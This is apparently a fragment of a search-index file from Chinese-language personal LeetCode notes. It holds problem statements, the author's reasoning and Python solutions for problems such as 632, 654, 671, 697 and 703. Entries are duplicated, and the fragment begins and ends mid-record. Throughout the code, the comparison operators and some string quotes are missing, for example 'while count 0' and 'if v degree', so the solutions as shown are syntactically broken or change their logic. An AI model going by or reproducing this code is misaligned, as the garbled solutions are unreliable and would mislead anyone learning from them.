\u91cd\u70b9\u662f\u5982\u4f55\u63d0\u53d6\u3002\u3002\u3002\u3002 \u5148\u8bd5\u8bd5\u66b4\u529b\u7684 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 class Solution : def smallestRange ( self , nums ): p = [ 0 for i in range ( len ( nums )) ] count = sum ([ len ( list_nums ) for list_nums in nums ]) all_nums = [] while count 0 : min_num = float ( INF ) record = 0 for index in range ( len ( p )): index_in_nums = p [ index ] if index_in_nums len ( nums [ index ]): if nums [ index ][ index_in_nums ] min_num : min_num = nums [ index ][ index_in_nums ] record = index p [ record ] += 1 all_nums . append ([ min_num , record ]) count -= 1 dp = [ 0 for i in range ( len ( all_nums ))] for i in range ( len ( all_nums )): record = set () for j in range ( i , len ( all_nums )): record . add ( all_nums [ j ][ 1 ]) if len ( record ) == len ( nums ): dp [ i ] = all_nums [ i ][ 0 ] , all_nums [ j ][ 0 ] break min_num = float ( INF ) res = [] for i in range ( len ( all_nums )): if dp [ i ] and dp [ i ][ 1 ] - dp [ i ][ 0 ] min_num : min_num = dp [ i ][ 1 ] - dp [ i ][ 0 ] res = dp [ i ] return res \u6211\u89c9\u5f97\u66b4\u529b\u7684\u65b9\u5f0f\u53ef\u4ee5\u7ee7\u7eed\u4f18\u5316\uff0c\u6bd4\u5982\u4f7f\u7528\u80cc\u5305\u95ee\u9898\u7684\u65b9\u5f0f \u6ed1\u52a8\u7a97\u53e3\uff1f","title":"632"},{"location":"LeetCode/vol 6/631-640/#637","text":"\u7ed9\u5b9a\u4e00\u4e2a\u4e8c\u53c9\u6811\uff0c\u8fd4\u56de\u4e00\u4e2a\u7531\u6bcf\u5c42\u8282\u70b9\u7684\u503c\u7684\u5e73\u5747\u6570\u6240\u6784\u6210\u7684\u6570\u7ec4 1 2 3 4 5 6 7 8 9 Input: 3 / \\ 9 20 / \\ 15 7 Output: [3, 14.5, 11] Explanation: The average value of nodes on level 0 is 3, on level 1 is 14.5, and on level 2 is 11. Hence return [3, 14.5, 11]. \u60f3\u6cd5 \u5c42\u5e8f\u904d\u5386\u7684\u53d8\u4f53\u3002\u3002\u3002\u6ca1\u4ec0\u4e48\u60f3\u6cd5","title":"637"},{"location":"LeetCode/vol 6/631-640/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution : def averageOfLevels ( self , root ): current_level = [ root ] res = [] next_level = [] while current_level : count = 0 for node in current_level : if node : count += node . val if node . left : next_level . append ( node . left ) if node . right : next_level . append ( node . right ) res . append ( count / float ( len ( current_level ))) current_level = next_level next_level = [] return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 6/651-660/","text":"654 \u6839\u636e\u4e00\u4e2a\u6570\u7ec4\uff0c\u6784\u5efa\u4e00\u4e2a\u4e8c\u53c9\u6811 \u6839\u8282\u70b9\u7684\u503c\u65f6\u8be5\u6570\u7ec4\u7684\u6700\u5927\u503c\uff0c\u5de6\u8fb9\u662f\u7531\u6700\u5927\u503c\u5de6\u8fb9\u90e8\u5206\u6784\u9020\u7684\u7684\u6700\u5927\u6570\uff0c\u53f3\u8fb9\u540c\u7406 1 2 3 4 5 6 7 8 9 10 Input: [3,2,1,6,0,5] Output: return the tree root node representing the following tree: 6 / \\ 3 5 \\ / 2 0 \\ 1 \u60f3\u6cd5 \u9012\u5f52\uff1f \u6216\u8005\u662f\u904d\u5386\uff1f \u5bf9\u4e8e\u6570\u7ec4\u7684\u6bcf\u4e2a\u503c\uff0c\u5982\u679c\u540e\u9762\u7684\u503c\u6bd4\u4e4b\u524d\u7684\u5927\uff0c\u90a3\u4e48TreeNode(vals[i+1]).left = TreeNode(vals[i])\uff0c\u7136\u540e\u8fd9\u6837\u904d\u5386\u4e0b\u53bb\uff1f\u5148\u8bd5\u8bd5\uff1f \u4e0d\u8fc7\u611f\u89c9\u8fd9\u9996\u5148\u9700\u8981\u628a\u6240\u6709\u7684\u8282\u70b9\u5148\u8bb0\u5f55\u4e0b\u6765\uff0c \u8bb0\u5f55\u5f15\u7528\uff1f \uff0c\u5b9e\u9645\u4e0a\u6548\u679c\u53ef\u80fd\u5e76\u4e0d\u597d\uff0c\u540c\u65f6\uff0c\u8fd8\u9700\u8981\u56de\u6eaf\u51fa\u4e4b\u524d\u7684\u6700\u5927\u6811\u7684\u8282\u70b9 \u770b\u6765\u8fd8\u662f\u7528\u9012\u5f52\u6bd4\u8f83\u597d \u6cd5\u4e00 \u7b80\u5355\u7684\u9012\u5f52\uff0c\u80fd\u5426\u8fdb\u4e00\u6b65\u4f18\u5316\uff1f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Solution : def constructMaximumBinaryTree ( self , nums ) - TreeNode : if len ( nums ) == 0 : return return self . __buildTree ( nums , 0 , len ( nums )) def __buildTree ( self , nums , start , end ): if start = end : return idx_max = start for i in range ( start + 1 , end ): if nums [ i ] nums [ idx_max ]: idx_max = i root = TreeNode ( nums [ idx_max ]) root . left = self . __buildTree ( nums , start , idx_max ) root . right = self . __buildTree ( nums , idx_max + 1 , end ) return root \u5176\u4ed6 \u5988\u7684\u6ca1\u533a\u522b\u554a\uff0c\u4e3a\u4ec0\u4e48\u90a3\u4e48\u5feb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Solution : def constructMaximumBinaryTree ( self , nums : List[int] ) - TreeNode : return self . constructTree ( nums ) def constructTree ( self , ls ): rootIndex = self . findMaxIndex ( ls ) root = TreeNode ( ls [ rootIndex ]) if rootIndex 0 : root . left = self . constructTree ( ls [ 0 : rootIndex ]) if rootIndex len ( ls ) - 1 : root . right = self . constructTree ( ls [ rootIndex + 1 : ]) return root def findMaxIndex ( self , ls ): maxx , index = ls [ 0 ], 0 for s in range ( len ( ls )): if ls [ s ] maxx : maxx , index = ls [ s ], s return index \u5783\u573e\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from utils.BinaryTree import * class Solution : def constructMaximumBinaryTree ( self , nums ) - TreeNode : if len ( nums ) == 0 : return max_index = 0 record = [] for i in range ( len ( nums )): record . append ( TreeNode ( nums [ i ])) if nums [ i ] = nums [ max_index ]: max_index = i for i in range ( 1 , len ( record )): if nums [ i ] nums [ i - 1 ]: record [ i ] . left = self . constructMaximumBinaryTree ( nums [: i ]) elif nums [ i ] nums [ i - 1 ]: record [ i - 1 ] . right = record [ i ] return record [ max_index ] 655 Todo \u6253\u5370\u4e8c\u53c9\u6811 \u5176\u4ed6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 class Solution ( object ): def printTree ( self , root ): :type root: TreeNode :rtype: List[List[str]] if root is None : return [ ] def depth ( root ): if root is None : return 0 return max ( depth ( root . left ), depth ( root . right )) + 1 d = depth ( root ) self . ans = [[ ] * ( 2 ** d - 1 ) for _ in range ( d )] def helper ( node , d , pos ): self . ans [ - d - 1 ][ pos ] = str ( node . val ) if node . left : helper ( node . left , d - 1 , pos - 2 ** ( d - 1 )) if node . right : helper ( node . right , d - 1 , pos + 2 ** ( d - 1 )) helper ( root , d - 1 , 2 ** ( d - 1 ) - 1 ) return self . ans","title":"651 660"},{"location":"LeetCode/vol 6/651-660/#654","text":"\u6839\u636e\u4e00\u4e2a\u6570\u7ec4\uff0c\u6784\u5efa\u4e00\u4e2a\u4e8c\u53c9\u6811 \u6839\u8282\u70b9\u7684\u503c\u65f6\u8be5\u6570\u7ec4\u7684\u6700\u5927\u503c\uff0c\u5de6\u8fb9\u662f\u7531\u6700\u5927\u503c\u5de6\u8fb9\u90e8\u5206\u6784\u9020\u7684\u7684\u6700\u5927\u6570\uff0c\u53f3\u8fb9\u540c\u7406 1 2 3 4 5 6 7 8 9 10 Input: [3,2,1,6,0,5] Output: return the tree root node representing the following tree: 6 / \\ 3 5 \\ / 2 0 \\ 1 \u60f3\u6cd5 \u9012\u5f52\uff1f \u6216\u8005\u662f\u904d\u5386\uff1f \u5bf9\u4e8e\u6570\u7ec4\u7684\u6bcf\u4e2a\u503c\uff0c\u5982\u679c\u540e\u9762\u7684\u503c\u6bd4\u4e4b\u524d\u7684\u5927\uff0c\u90a3\u4e48TreeNode(vals[i+1]).left = TreeNode(vals[i])\uff0c\u7136\u540e\u8fd9\u6837\u904d\u5386\u4e0b\u53bb\uff1f\u5148\u8bd5\u8bd5\uff1f \u4e0d\u8fc7\u611f\u89c9\u8fd9\u9996\u5148\u9700\u8981\u628a\u6240\u6709\u7684\u8282\u70b9\u5148\u8bb0\u5f55\u4e0b\u6765\uff0c \u8bb0\u5f55\u5f15\u7528\uff1f \uff0c\u5b9e\u9645\u4e0a\u6548\u679c\u53ef\u80fd\u5e76\u4e0d\u597d\uff0c\u540c\u65f6\uff0c\u8fd8\u9700\u8981\u56de\u6eaf\u51fa\u4e4b\u524d\u7684\u6700\u5927\u6811\u7684\u8282\u70b9 \u770b\u6765\u8fd8\u662f\u7528\u9012\u5f52\u6bd4\u8f83\u597d","title":"654"},{"location":"LeetCode/vol 6/651-660/#_1","text":"\u7b80\u5355\u7684\u9012\u5f52\uff0c\u80fd\u5426\u8fdb\u4e00\u6b65\u4f18\u5316\uff1f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Solution : def constructMaximumBinaryTree ( self , nums ) - TreeNode : if len ( nums ) == 0 : return return self . __buildTree ( nums , 0 , len ( nums )) def __buildTree ( self , nums , start , end ): if start = end : return idx_max = start for i in range ( start + 1 , end ): if nums [ i ] nums [ idx_max ]: idx_max = i root = TreeNode ( nums [ idx_max ]) root . left = self . __buildTree ( nums , start , idx_max ) root . right = self . __buildTree ( nums , idx_max + 1 , end ) return root","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 6/651-660/#_2","text":"\u5988\u7684\u6ca1\u533a\u522b\u554a\uff0c\u4e3a\u4ec0\u4e48\u90a3\u4e48\u5feb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Solution : def constructMaximumBinaryTree ( self , nums : List[int] ) - TreeNode : return self . constructTree ( nums ) def constructTree ( self , ls ): rootIndex = self . findMaxIndex ( ls ) root = TreeNode ( ls [ rootIndex ]) if rootIndex 0 : root . left = self . constructTree ( ls [ 0 : rootIndex ]) if rootIndex len ( ls ) - 1 : root . right = self . constructTree ( ls [ rootIndex + 1 : ]) return root def findMaxIndex ( self , ls ): maxx , index = ls [ 0 ], 0 for s in range ( len ( ls )): if ls [ s ] maxx : maxx , index = ls [ s ], s return index","title":"\u5176\u4ed6"},{"location":"LeetCode/vol 6/651-660/#_3","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from utils.BinaryTree import * class Solution : def constructMaximumBinaryTree ( self , nums ) - TreeNode : if len ( nums ) == 0 : return max_index = 0 record = [] for i in range ( len ( nums )): record . append ( TreeNode ( nums [ i ])) if nums [ i ] = nums [ max_index ]: max_index = i for i in range ( 1 , len ( record )): if nums [ i ] nums [ i - 1 ]: record [ i ] . left = self . constructMaximumBinaryTree ( nums [: i ]) elif nums [ i ] nums [ i - 1 ]: record [ i - 1 ] . right = record [ i ] return record [ max_index ]","title":"\u5783\u573e\u4ee3\u7801"},{"location":"LeetCode/vol 6/651-660/#655","text":"Todo \u6253\u5370\u4e8c\u53c9\u6811","title":"655"},{"location":"LeetCode/vol 6/651-660/#_4","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 class Solution ( object ): def printTree ( self , root ): :type root: TreeNode :rtype: List[List[str]] if root is None : return [ ] def depth ( root ): if root is None : return 0 return max ( depth ( root . left ), depth ( root . right )) + 1 d = depth ( root ) self . ans = [[ ] * ( 2 ** d - 1 ) for _ in range ( d )] def helper ( node , d , pos ): self . ans [ - d - 1 ][ pos ] = str ( node . val ) if node . left : helper ( node . left , d - 1 , pos - 2 ** ( d - 1 )) if node . right : helper ( node . right , d - 1 , pos + 2 ** ( d - 1 )) helper ( root , d - 1 , 2 ** ( d - 1 ) - 1 ) return self . ans","title":"\u5176\u4ed6"},{"location":"LeetCode/vol 6/671-680/","text":"671 \u4e8c\u53c9\u6811\u7684\u7b2c\u4e8c\u5c0f\u7684\u8282\u70b9 \u7ed9\u5b9a\u975e\u7a7a\u7684\u7279\u6b8a\u4e8c\u53c9\u6811\uff0c\u5176\u7531\u5177\u6709\u975e\u8d1f\u503c\u7684\u8282\u70b9\u7ec4\u6210\uff0c\u5176\u4e2d\u8be5\u6811\u4e2d\u7684\u6bcf\u4e2a\u8282\u70b9\u5177\u6709\u6070\u597d\u4e24\u4e2a\u6216\u96f6\u4e2a\u5b50\u8282\u70b9\u3002 \u5982\u679c\u8282\u70b9\u5177\u6709\u4e24\u4e2a\u5b50\u8282\u70b9\uff0c\u5219\u8be5\u8282\u70b9\u7684\u503c\u662f\u5176\u4e24\u4e2a\u5b50\u8282\u70b9\u4e2d\u7684\u8f83\u5c0f\u503c\u3002 \u51c6\u786e\u5730\u8bf4\uff0c root.val = min(root.left.val\uff0croot.right.val) \u59cb\u7ec8\u6210\u7acb\u3002 \u5bf9\u4e8e\u7ed9\u5b9a\u8fd9\u6837\u7684\u4e8c\u53c9\u6570\uff0c\u8fd4\u56de\u8be5\u4e8c\u53c9\u6811\u5185\u7684\u7b2c\u4e8c\u5c0f\u7684\u503c \u5982\u679c\u6ca1\u6709\uff0c\u8fd4\u56de-1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 Example 1: Input: 2 / \\ 2 5 / \\ 5 7 Output: 5 Explanation: The smallest value is 2, the second smallest value is 5. Example 2: Input: 2 / \\ 2 2 Output: -1 Explanation: The smallest value is 2, but there isn t any second smallest value. \u60f3\u6cd5 emmm\uff0c\u6211\u6709\u70b9\u6ca1\u770b\u61c2\u8fd9\u9898\uff0c\u662f\u4e0d\u662f\u53ea\u8981\u8fd4\u56deroot\u8282\u70b9\u4e0e\u5176\u4e24\u4e2a\u5b50\u8282\u70b9\u7684\u7b2c\u4e8c\u5c0f\u7684\u503c\u5c31\u884c\u4e86 \u8bd5\u4e86\u4e0b\uff0c\u679c\u7136\u4e0d\u884c \u6f0f\u4e86\u6761\u4ef6\uff0c\u5f62\u5982 1 2 3 4 5 1 1 3 1 1 3 4 3 1 1 1 3 8 4 8 3 3 1 6 2 1 \u8fd9\u79cd\u4e0d\u884c\uff0c\u8fd4\u56de\u7684\u662f3 \u90a3\u5c31\u6df1\u5ea6\u4fbf\u5229\u9012\u5f52\u54af \u6cd5\u4e00 Todo \u4e00\u5f00\u59cb\u60f3\u7684\u5c06\u5b50\u6811\u7684\u7b26\u5408\u6761\u4ef6\u7684\u6570\u4e0a\u6d6e\uff0c\u5224\u65ad\u5b50\u6811\u7684 findSecondMinimumValue \uff0c\u63a5\u7740\u7ee7\u7eed\u5224\u65ad\u5411\u4e0a \u4f46\u662f\u6ca1\u5b9e\u73b0\u51fa\u6765\u3002\u3002\u3002 \u540e\u6765\u5e72\u8106\u904d\u5386\u4e86 1 2 3 4 5 6 7 8 9 10 11 12 class Solution : def findSecondMinimumValue ( self , root : TreeNode ) - int : self . res = float ( inf ) def dfs ( node ): if node : if root . val node . val and node . val self . res : self . res = node . val elif node . val == root . val : dfs ( node . left ) dfs ( node . right ) dfs ( root ) return self . res if self . res float ( inf ) else - 1","title":"671 680"},{"location":"LeetCode/vol 6/671-680/#671","text":"\u4e8c\u53c9\u6811\u7684\u7b2c\u4e8c\u5c0f\u7684\u8282\u70b9 \u7ed9\u5b9a\u975e\u7a7a\u7684\u7279\u6b8a\u4e8c\u53c9\u6811\uff0c\u5176\u7531\u5177\u6709\u975e\u8d1f\u503c\u7684\u8282\u70b9\u7ec4\u6210\uff0c\u5176\u4e2d\u8be5\u6811\u4e2d\u7684\u6bcf\u4e2a\u8282\u70b9\u5177\u6709\u6070\u597d\u4e24\u4e2a\u6216\u96f6\u4e2a\u5b50\u8282\u70b9\u3002 \u5982\u679c\u8282\u70b9\u5177\u6709\u4e24\u4e2a\u5b50\u8282\u70b9\uff0c\u5219\u8be5\u8282\u70b9\u7684\u503c\u662f\u5176\u4e24\u4e2a\u5b50\u8282\u70b9\u4e2d\u7684\u8f83\u5c0f\u503c\u3002 \u51c6\u786e\u5730\u8bf4\uff0c root.val = min(root.left.val\uff0croot.right.val) \u59cb\u7ec8\u6210\u7acb\u3002 \u5bf9\u4e8e\u7ed9\u5b9a\u8fd9\u6837\u7684\u4e8c\u53c9\u6570\uff0c\u8fd4\u56de\u8be5\u4e8c\u53c9\u6811\u5185\u7684\u7b2c\u4e8c\u5c0f\u7684\u503c \u5982\u679c\u6ca1\u6709\uff0c\u8fd4\u56de-1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 Example 1: Input: 2 / \\ 2 5 / \\ 5 7 Output: 5 Explanation: The smallest value is 2, the second smallest value is 5. Example 2: Input: 2 / \\ 2 2 Output: -1 Explanation: The smallest value is 2, but there isn t any second smallest value. \u60f3\u6cd5 emmm\uff0c\u6211\u6709\u70b9\u6ca1\u770b\u61c2\u8fd9\u9898\uff0c\u662f\u4e0d\u662f\u53ea\u8981\u8fd4\u56deroot\u8282\u70b9\u4e0e\u5176\u4e24\u4e2a\u5b50\u8282\u70b9\u7684\u7b2c\u4e8c\u5c0f\u7684\u503c\u5c31\u884c\u4e86 \u8bd5\u4e86\u4e0b\uff0c\u679c\u7136\u4e0d\u884c \u6f0f\u4e86\u6761\u4ef6\uff0c\u5f62\u5982 1 2 3 4 5 1 1 3 1 1 3 4 3 1 1 1 3 8 4 8 3 3 1 6 2 1 \u8fd9\u79cd\u4e0d\u884c\uff0c\u8fd4\u56de\u7684\u662f3 \u90a3\u5c31\u6df1\u5ea6\u4fbf\u5229\u9012\u5f52\u54af","title":"671"},{"location":"LeetCode/vol 6/671-680/#_1","text":"Todo \u4e00\u5f00\u59cb\u60f3\u7684\u5c06\u5b50\u6811\u7684\u7b26\u5408\u6761\u4ef6\u7684\u6570\u4e0a\u6d6e\uff0c\u5224\u65ad\u5b50\u6811\u7684 findSecondMinimumValue \uff0c\u63a5\u7740\u7ee7\u7eed\u5224\u65ad\u5411\u4e0a \u4f46\u662f\u6ca1\u5b9e\u73b0\u51fa\u6765\u3002\u3002\u3002 \u540e\u6765\u5e72\u8106\u904d\u5386\u4e86 1 2 3 4 5 6 7 8 9 10 11 12 class Solution : def findSecondMinimumValue ( self , root : TreeNode ) - int : self . res = float ( inf ) def dfs ( node ): if node : if root . val node . val and node . val self . res : self . res = node . val elif node . val == root . val : dfs ( node . left ) dfs ( node . right ) dfs ( root ) return self . res if self . res float ( inf ) else - 1","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 6/691-700/","text":"697 \u7ed9\u5b9a\u7531\u975e\u8d1f\u6574\u6570\u7ec4\u6210\u7684\u975e\u7a7a\u6570\u7ec4nums\uff0c\u8be5\u6570\u7ec4\u7684\u5ea6\u6570\u88ab\u5b9a\u4e49\u4e3a\u5176\u4efb\u4f55\u4e00\u4e2a\u5143\u7d20\u7684\u6700\u5927\u9891\u7387\u3002 \u672c\u9898\u662f\u662f\u627e\u5230\u4e00\u4e2a\uff08\u8fde\u7eed\u7684\uff09nums\u5b50\u9635\u5217\u7684 \u6f5c\u5728\u6700\u5c0f\u957f\u5ea6\uff0c\u4f7f\u5f97\u5b83\u4e0enums\u5177\u6709\u76f8\u540c\u7684\u5ea6\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 Example 1: Input: [1, 2, 2, 3, 1] Output: 2 Explanation: The input array has a degree of 2 because both elements 1 and 2 appear twice. Of the subarrays that have the same degree: [1, 2, 2, 3, 1], [1, 2, 2, 3], [2, 2, 3, 1], [1, 2, 2], [2, 2, 3], [2, 2] The shortest length is 2. So return 2. Example 2: Input: [1,2,2,3,1,4,2] Output: 6 \u60f3\u6cd5 \u9996\u5148\uff0c\u8ba1\u7b97\u5ea6\u6570\uff0c\u5f97\u5230\u5ea6\u6570\u548c\u5bf9\u5e94\u7684\u6570\u5b57\uff0c\u7136\u540e\u6570\u7b2c\u4e00\u4e2a\u548c\u6700\u548c\u4e00\u4e2a\u7684\u4e0b\u6807\uff0c\u76f8\u51cf\u4e4b\uff1f \u4e0d\u884c\uff0c\u6709\u53ef\u80fd\u6709\u591a\u4e2a\u6700\u5927\u5ea6\u6570\uff0c\u5982\u4e0b [2,1,1,2,1,3,3,3,1,3,1,3,2] \u90a3\u4e48\u5c31\u8bb0\u5f55\u4e0b\u6765\u591a\u4e2a\u6700\u5927\u503c\uff0c\u7136\u540e\u904d\u5386\u8ba1\u7b97\u4ec0\u4e48\u7684\uff1f \u5982\u4e0b\u9762\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution : def findShortestSubArray ( self , nums ): dic = {} for index , num in enumerate ( nums ): dic [ num ] = dic . get ( num , 0 ) + 1 max_degree_num = [] degree = 0 for k , v in dic . items (): if v degree : degree = v max_degree_num = [ k ] elif v == degree : max_degree_num . append ( k ) tmp_ans = [] for max_num in max_degree_num : tmp = [ index for index , num in enumerate ( nums ) if num == max_num ] tmp_ans . append ( tmp [ - 1 ] - tmp [ 0 ] + 1 ) return min ( tmp_ans ) \u8d85\u65f6\u4e86\u3002\u3002\u3002\u3002 \u60f3\u60f3\u4e5f\u662f\uff0c\u5982\u679c\u90fd\u4e0d\u76f8\u540c\uff0c\u90a3\u4e48\u5c82\u4e0d\u5c31\u662fO(n^2)\u4e86\u3002\u3002\u3002 \u6709\u4ec0\u4e48\u53ef\u4ee5\u4f18\u5316\u7684\u529e\u6cd5\u4e48 \u90a3\u5c31\u591a\u6b21\u904d\u5386\u5230\u4e00\u6b21\u904d\u5386 \u6cd5\u4e00 Todo \u901f\u5ea6\u6709\u70b9\u6162\uff0c\u6709\u6ca1\u6709\u5176\u4ed6\u65b9\u5f0f\uff1f 1 2 3 4 5 6 7 8 9 10 11 12 class Solution : def findShortestSubArray ( self , nums ): first , counter , res , degree = {}, {}, 0 , 0 for i , v in enumerate ( nums ): first . setdefault ( v , i ) counter [ v ] = counter . get ( v , 0 ) + 1 if counter [ v ] degree : degree = counter [ v ] res = i - first [ v ] + 1 elif counter [ v ] == degree : res = min ( res , i - first [ v ] + 1 ) return res","title":"691 700"},{"location":"LeetCode/vol 6/691-700/#697","text":"\u7ed9\u5b9a\u7531\u975e\u8d1f\u6574\u6570\u7ec4\u6210\u7684\u975e\u7a7a\u6570\u7ec4nums\uff0c\u8be5\u6570\u7ec4\u7684\u5ea6\u6570\u88ab\u5b9a\u4e49\u4e3a\u5176\u4efb\u4f55\u4e00\u4e2a\u5143\u7d20\u7684\u6700\u5927\u9891\u7387\u3002 \u672c\u9898\u662f\u662f\u627e\u5230\u4e00\u4e2a\uff08\u8fde\u7eed\u7684\uff09nums\u5b50\u9635\u5217\u7684 \u6f5c\u5728\u6700\u5c0f\u957f\u5ea6\uff0c\u4f7f\u5f97\u5b83\u4e0enums\u5177\u6709\u76f8\u540c\u7684\u5ea6\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 Example 1: Input: [1, 2, 2, 3, 1] Output: 2 Explanation: The input array has a degree of 2 because both elements 1 and 2 appear twice. Of the subarrays that have the same degree: [1, 2, 2, 3, 1], [1, 2, 2, 3], [2, 2, 3, 1], [1, 2, 2], [2, 2, 3], [2, 2] The shortest length is 2. So return 2. Example 2: Input: [1,2,2,3,1,4,2] Output: 6 \u60f3\u6cd5 \u9996\u5148\uff0c\u8ba1\u7b97\u5ea6\u6570\uff0c\u5f97\u5230\u5ea6\u6570\u548c\u5bf9\u5e94\u7684\u6570\u5b57\uff0c\u7136\u540e\u6570\u7b2c\u4e00\u4e2a\u548c\u6700\u548c\u4e00\u4e2a\u7684\u4e0b\u6807\uff0c\u76f8\u51cf\u4e4b\uff1f \u4e0d\u884c\uff0c\u6709\u53ef\u80fd\u6709\u591a\u4e2a\u6700\u5927\u5ea6\u6570\uff0c\u5982\u4e0b [2,1,1,2,1,3,3,3,1,3,1,3,2] \u90a3\u4e48\u5c31\u8bb0\u5f55\u4e0b\u6765\u591a\u4e2a\u6700\u5927\u503c\uff0c\u7136\u540e\u904d\u5386\u8ba1\u7b97\u4ec0\u4e48\u7684\uff1f \u5982\u4e0b\u9762\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution : def findShortestSubArray ( self , nums ): dic = {} for index , num in enumerate ( nums ): dic [ num ] = dic . get ( num , 0 ) + 1 max_degree_num = [] degree = 0 for k , v in dic . items (): if v degree : degree = v max_degree_num = [ k ] elif v == degree : max_degree_num . append ( k ) tmp_ans = [] for max_num in max_degree_num : tmp = [ index for index , num in enumerate ( nums ) if num == max_num ] tmp_ans . append ( tmp [ - 1 ] - tmp [ 0 ] + 1 ) return min ( tmp_ans ) \u8d85\u65f6\u4e86\u3002\u3002\u3002\u3002 \u60f3\u60f3\u4e5f\u662f\uff0c\u5982\u679c\u90fd\u4e0d\u76f8\u540c\uff0c\u90a3\u4e48\u5c82\u4e0d\u5c31\u662fO(n^2)\u4e86\u3002\u3002\u3002 \u6709\u4ec0\u4e48\u53ef\u4ee5\u4f18\u5316\u7684\u529e\u6cd5\u4e48 \u90a3\u5c31\u591a\u6b21\u904d\u5386\u5230\u4e00\u6b21\u904d\u5386","title":"697"},{"location":"LeetCode/vol 6/691-700/#_1","text":"Todo \u901f\u5ea6\u6709\u70b9\u6162\uff0c\u6709\u6ca1\u6709\u5176\u4ed6\u65b9\u5f0f\uff1f 1 2 3 4 5 6 7 8 9 10 11 12 class Solution : def findShortestSubArray ( self , nums ): first , counter , res , degree = {}, {}, 0 , 0 for i , v in enumerate ( nums ): first . setdefault ( v , i ) counter [ v ] = counter . get ( v , 0 ) + 1 if counter [ v ] degree : degree = counter [ v ] res = i - first [ v ] + 1 elif counter [ v ] == degree : res = min ( res , i - first [ v ] + 1 ) return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 7/701-710/","text":"701 \u5f80\u4e8c\u53c9\u641c\u7d22\u6811\u4e2d\u63d2\u5165\u4e00\u4e2a\u503c \u6cd5\u4e00 \u76f4\u63a5\u66b4\u529b\u63d2\u5165 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Solution : def insertIntoBST ( self , root : TreeNode , val : int ) - TreeNode : p = root while p : if val p . val : if p . right : p = p . right else : p . right = TreeNode ( val ) break elif val p . val : if p . left : p = p . left else : p . left = TreeNode ( val ) break return root \u6cd5\u4e8c \u6216\u8005\u9012\u5f52 1 2 3 4 5 6 7 8 9 class Solution : def insertIntoBST ( self , root : TreeNode , val : int ) - TreeNode : if not root : return TreeNode ( val ) if root . val val : root . left = self . insertIntoBST ( root . left , val ) else : root . right = self . insertIntoBST ( root . right , val ) return root 703 \u5b9e\u73b0\u4e00\u4e2a\u7c7b\u6765\u67e5\u627e\u6d41\u4e2d\u7b2ck\u4e2a\u6700\u5927\u5143\u7d20\u3002 \u8bf7\u6ce8\u610f\uff0c\u5b83\u662f\u6392\u5e8f\u987a\u5e8f\u4e2d\u7684\u7b2ck\u4e2a\u6700\u5927\u5143\u7d20\uff0c\u800c\u4e0d\u662f\u7b2ck\u4e2a\u4e0d\u540c\u5143\u7d20\u3002 KthLargest\u7c7b\u5c06\u6709\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u5b83\u63a5\u53d7\u4e00\u4e2a\u6574\u6570k\u548c\u4e00\u4e2a\u6574\u6570\u6570\u7ec4nums\uff0c\u5b83\u5305\u542b\u6765\u81ea\u6d41\u7684\u521d\u59cb\u5143\u7d20\u3002 \u5bf9\u4e8e\u65b9\u6cd5KthLargest.add\u7684\u6bcf\u6b21\u8c03\u7528\uff0c\u8fd4\u56de\u8868\u793a\u6d41\u4e2d\u7b2ck\u4e2a\u6700\u5927\u5143\u7d20\u7684\u5143\u7d20\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 int k = 3; int[] arr = [4,5,8,2]; KthLargest kthLargest = new KthLargest(3, arr); // 2 3 4 5 8 kthLargest.add(3); // returns 4 // 2 3 4 5 5 8 kthLargest.add(5); // returns 5 // 2 3 4 5 5 8 10 kthLargest.add(10); // returns 5 // 2 3 4 5 5 8 9 10 kthLargest.add(9); // returns 8 // 2 3 4 5 5 8 8 9 10 kthLargest.add(4); // returns 8 \u60f3\u6cd5 \u5c0f\u6839\u5806\uff0c\u7ef4\u62a4\u4e00\u4e2a\u6709k\u5927\u7684\u5c0f\u6839\u5806\uff0c\u6bd4\u5806\u9876\u6570\u5b57\u8fd8\u8981\u5c0f\u7684\u5c31\u4e0d\u653e\u5806\u4e86\uff0c\u5426\u5219\u7684\u5c31\u628a\u5806\u9876\u7684\u5143\u7d20pop\u6389\uff0c\u7136\u540e\u91cd\u65b0\u6392\u5217\u5806 \u91cd\u70b9\u662f\u5b9e\u73b0\u5c0f\u6839\u5806\u7684\u8fc7\u7a0b\u3002\u3002\u3002 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 def heapPush ( heap , item ): heap . append ( item ) _siftdown ( heap , 0 , len ( heap ) - 1 ) def _siftdown ( heap , startPos , pos ): 